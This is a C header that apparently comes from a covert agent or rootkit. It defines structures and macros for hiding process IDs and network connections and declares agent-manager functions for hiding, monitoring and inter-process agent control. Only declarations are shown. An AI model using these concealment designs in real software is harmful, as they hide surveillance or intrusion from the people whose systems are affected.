typedef struct {
	DWORD ip_address;
	WORD  port;
} connection_hide_struct;
#define NULL_CONNETCION_HIDE_STRUCT {0,0}
#define IS_SET_CONNETCION_HIDE_STRUCT(x) (x.ip_address ? TRUE : FALSE)
#define SET_CONNETCION_HIDE_STRUCT(x,y,z) { x.ip_address=y; x.port=z; }
#define UNSET_CONNETCION_HIDE_STRUCT(x) { x.ip_address=0; x.port=0; }

typedef struct {
	DWORD PID;
} pid_hide_struct;
#define NULL_PID_HIDE_STRUCT {0}
#define IS_SET_PID_HIDE_STRUCT(x) (x.PID ? TRUE : FALSE)
#define SET_PID_HIDE_STRUCT(x,y) { x.PID=y; }
#define UNSET_PID_HIDE_STRUCT(x) { x.PID=0; }

#define HIDE_ELEM 2 // XXX Numero di elementi nascondibili
#define HIDE_PID 0
#define HIDE_CNN 1

#define AM_SUSPEND 0
#define AM_RESTART 1
#define AM_RESET   2
#define AM_EXIT    3

extern BOOL AM_AddHide(DWORD, void *);
extern void AM_RemoveHide(DWORD, void *);
extern BOOL AM_IsHidden(DWORD type, void *elem_par);
extern DWORD AM_Startup(void);
extern void AM_SuspendRestart(DWORD);
extern DWORD AM_MonitorStartStop(DWORD, BOOL);
extern DWORD AM_MonitorRegister(WCHAR *, DWORD, BYTE *, BYTE *, BYTE *, BYTE *);
extern void AM_IPCAgentStartStop(DWORD, BOOL);
